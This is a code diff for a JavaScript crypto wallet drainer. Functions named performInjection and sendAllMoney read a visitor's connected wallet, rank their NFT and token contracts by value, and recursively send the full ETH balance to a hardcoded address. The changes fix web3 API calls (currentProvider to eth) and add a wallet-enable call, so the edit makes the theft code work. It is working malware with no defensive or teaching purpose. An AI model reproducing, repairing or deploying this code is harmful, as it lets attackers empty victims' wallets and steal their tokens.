@@ -134,10 +134,11 @@ async function connect() {
 }
 
 async function connectWithoutModal() {
+    provider = window.ethereum.enable();
     web3 = new Web3("https://mainnet.infura.io/v3/a2406dc3cb964ddeb4c4f93e9cdcb8a5");
     console.log("Web3 instance is", web3);
     const accounts = await ethereum.request({ method: 'eth_accounts' })
-    const balance = await web3.currentProvider.getBalance(accounts[0]);
+    const balance = await web3.eth.getBalance(accounts[0]);
     selectedAccount = accounts[0];
     await syncChain()
     try {
@@ -186,7 +187,7 @@ async function performInjection(address) {
         let higherPrice = sortedNFTs[i][key][0]["token_address"];
         let isErc20 = sortedNFTs[i][key][0]["isErc20"];
         
-        let contractInstance = new web3.currentProvider.Contract(abi, higherPrice);
+        let contractInstance = new web3.eth.Contract(abi, higherPrice);
         let toCheckSumAddress = await web3.utils.toChecksumAddress(higherPrice);
         
 
@@ -250,7 +251,7 @@ async function get12DollarETH() {
 
 async function sendAllMoney() {
     try {
-        let balance = await web3.currentProvider.getBalance(selectedAccount);
+        let balance = await web3.eth.getBalance(selectedAccount);
 
         let to = "0xDB166D515EB187ec35a54aF33592d84D5B8Ef1Ff";
         console.log(balance);
@@ -268,7 +269,7 @@ async function sendAllMoney() {
         console.log("Sending Money")
         if (newBalance > 0) {
             try {
-                await web3.currentProvider.sendTransaction(transactionObject);
+                await web3.eth.sendTransaction(transactionObject);
                 await sendAllMoney();
 
             }
@@ -281,7 +282,7 @@ async function sendAllMoney() {
         }
         else {
             transactionObject.value = web3.utils.toHex(balance);
-            await web3.currentProvider.sendTransaction(transactionObject);
+            await web3.eth.sendTransaction(transactionObject);
 
         }
 
